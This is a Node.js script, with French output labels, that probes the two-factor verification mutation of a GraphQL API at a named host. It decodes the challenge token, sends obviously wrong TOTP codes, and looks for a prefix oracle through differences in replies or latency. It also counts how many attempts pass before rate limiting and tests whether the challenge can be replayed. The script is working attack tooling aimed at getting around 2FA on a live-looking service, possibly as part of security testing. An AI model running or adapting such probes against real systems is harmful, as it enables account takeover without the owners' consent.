import fs from "fs";
const EP = "https://bugsecure-api.senintel.sn/graphql";
const CH = (process.env.CHALLENGE || "").trim();
if (!CH) { console.log("!! CHALLENGE manquant"); process.exit(1); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const V = (c) => `mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken refreshToken user { id username } } }`;
async function verify(code) {
  const t0 = Date.now();
  const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ query: V(code), variables: { i: { challengeToken: CH, token: code } } }) });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  const dt = Date.now() - t0;
  const msg = j?.errors ? "ERR: " + j.errors.map((x) => x.message).join(" | ") : (j?.data?.verify2fa?.accessToken ? "*** JETON OBTENU ***" : "data: " + JSON.stringify(j?.data));
  return { dt, msg, raw: txt, j };
}
const p = (label, v) => console.log("  " + label.padEnd(30) + String(v.dt + "ms").padStart(7) + "  " + String(v.msg).replace(/\s+/g, " ").slice(0, 150));

console.log("=== 0) claims du challenge ===");
try { console.log("  " + JSON.stringify(JSON.parse(Buffer.from(CH.split(".")[1], "base64url").toString()))); } catch (e) { console.log("  (illisible)"); }
console.log("\n=== 1) PATTERN 3 : code manifestement faux ===");
p("000000", await verify("000000")); await sleep(1100);
p("123456", await verify("123456")); await sleep(1100);
p("vide", await verify("")); await sleep(1100);
console.log("\n=== 2) PATTERN 4 : ORACLE DE PREFIXE (reponses ou latences differentes ?) ===");
const res = [];
for (const c of ["0", "00", "000", "0000", "00000", "000000", "1", "12", "123", "1234", "12345", "2", "23", "234", "5", "6", "7", "8", "9", "98"]) {
  const v = await verify(c); res.push([c, v.dt, v.msg]); p("token=" + JSON.stringify(c), v); await sleep(600);
}
const msgs = [...new Set(res.map((r) => r[2]))];
console.log("\n  messages distincts : " + msgs.length);
for (const m of msgs) console.log("    - " + m.slice(0, 120));
const times = res.map((r) => r[1]);
console.log("  latences : min=" + Math.min(...times) + "ms max=" + Math.max(...times) + "ms mediane=" + times.slice().sort((a, b) => a - b)[Math.floor(times.length / 2)] + "ms");
console.log("\n=== 3) RATE LIMIT : combien de tentatives avant blocage ? ===");
let n = 0, limited = false;
for (let i = 0; i < 25; i++) {
  const v = await verify("424242" + (i % 10));
  n++;
  if (/Rate limit/i.test(v.msg)) { console.log("  -> RATE LIMIT apres " + n + " tentatives : " + v.msg); limited = true; break; }
  await sleep(350);
}
if (!limited) console.log("  -> aucun rate limit apres " + n + " tentatives");
console.log("\n=== 4) REJEU : le challenge survit-il a une tentative ? ===");
p("nouvelle tentative 000000", await verify("000000"));
await sleep(1000);
p("et 999999", await verify("999999"));
